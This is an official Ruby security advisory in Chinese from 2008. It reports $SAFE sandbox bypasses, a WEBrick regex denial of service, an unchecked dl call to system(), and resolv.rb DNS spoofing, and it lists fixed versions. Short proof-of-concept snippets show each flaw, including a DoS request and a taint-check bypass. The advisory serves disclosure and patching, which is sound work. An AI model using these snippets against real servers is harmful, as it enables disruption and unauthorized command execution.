---
layout: news_post
title: "Ruby中的多个安全漏洞 - Ruby 官方网站"
author: "Xpol Wan"
date: 2008-08-08 04:40:03 +0000
lang: zh_cn
---

Ruby中发现多个安全漏洞。建议你更新到最新版本。

## 详情

发现以下安全漏洞。

### 在安全级别下的几个漏洞

发现在安全级别下存在几个漏洞。

* 在安全级别4下untrace\_var被允许。

      trace_var(:$VAR) {|val| puts "$VAR = #{val}" }

      Thread.new do
       $SAFE = 4
       eval %q{
         proc = untrace_var :$VAR
         proc.first.call("aaa")
       }
      end.join

* 在安全级别4下$PROGRAM\_NAME可能被修改。

      Thread.new do
       $SAFE = 4
       eval %q{$PROGRAM_NAME.replace "Hello, World!"}
      end.join

      $PROGRAM_NAME #=> "Hello, World!"

* 在安全级别1-3下可能调用不安全的方法。

      class Hello
       def world
         Thread.new do
           $SAFE = 4
           msg = "Hello, World!"
           def msg.size
             self.replace self*10 # replace string
             1 # return wrong size
           end
           msg
         end.value
       end
      end

      $SAFE = 1 # or 2, or 3
      s = Hello.new.world
      if s.kind_of?(String)
       puts s if s.size < 20 # print string which size is less than 20
      end

* 在安全级别4下Syslog操作被允许。

      require "syslog"

      Syslog.open

      Thread.new do
       $SAFE = 4
       eval %q{
         Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
         Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
         Syslog.info("masked")
         Syslog.close
       }
      end.join

以上漏洞是由Keita Yamaguchi报告的。

### WEBrick中的致拒绝服务(DoS)漏洞

WEBrick::HTTP::DefaultFileHandler存在消耗指数时间响应请求的错误，
因为WEBrick::HTTPUtils.split\_header\_value中的一个回溯正则表达式 （backtracking
regular expression）。

可被利用的服务器：

    require 'webrick'
    WEBrick::HTTPServer.new(:Port => 2000, :DocumentRoot => "/etc").start

攻击：

    require 'net/http'
    res = Net::HTTP.start("localhost", 2000) { |http|
      req = Net::HTTP::Get.new("/passwd")
      req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
      http.request(req)
    }
    p res

在这个例子中这个请求很可能无法完成。

这个漏洞是由Christian Neukirchen报告的。

### dl中缺乏完整性检查
{: #label-3}

dl没有进行完整性检查，因此可能允许攻击者调用危险的函数。

    require 'dl'
    $SAFE = 1
    h = DL.dlopen(nil)
    sys = h.sym('system', 'IP')
    uname = 'uname -rs'.taint
    sys[uname]

这个漏洞是由sheepman报告的。

### resolv.rb的欺骗DNS漏洞

resolv.rb允许远程攻击者欺骗DNS响应。这个漏洞可以通过随机的DNS事务ID和源端口来解决。
所以resolv.rb已经采用随机化的方式来修正。

* 参考： [CVE-2008-1447][1]

这个漏洞是由Tanaka Akira报告的。

## 受影响的版本

1.8系列
: * 1\.8.5 和所有之前的版本
  * 1\.8.6-p285 和所有之前的版本
  * 1\.8.7-p70 和所有之前的版本

1.9系列
: * r18423 和所有之前的修订版本

## 解决办法

1.8系列
: 请更新到1.8.6-p286或者1.8.7-p71。

  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p286.tar.gz&gt;][2]

        (md5: 797ea136fe43e4286c9362ee4516674e,
        sha256: 1774de918b156c360843c1b68690f5f57532ee48ff079d4d05c51dace8d523ed,
        size: 4590373)

  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p71.tar.gz&gt;][3]

        (md5: 721741d1e0785a0b6b9fb07d55184908,
        sha256: 30ec4298e9ac186a2fe1a94362919ba805538252b707f3aadae1938429269c1a,
        size: 4805478)

1.9系列

: 请通过Subversion取得最新版本。

      $ svn co https://git.ruby-lang.org/ruby.git/tree/?id=master ruby

请注意修正这个漏洞的软件包可能已经可以通过你的软件包管理软件更新了。

## 贡献者

感谢Keita Yamaguchi, Christian Neukirchen, sheepman, and Tanaka Akira为Ruby
Security Team指出这个问题。

## 修订记录

* 2008-08-08 12:21 +09:00 fixed the revision number of ruby 1.9.



[1]: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447
[2]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p286.tar.gz
[3]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p71.tar.gz
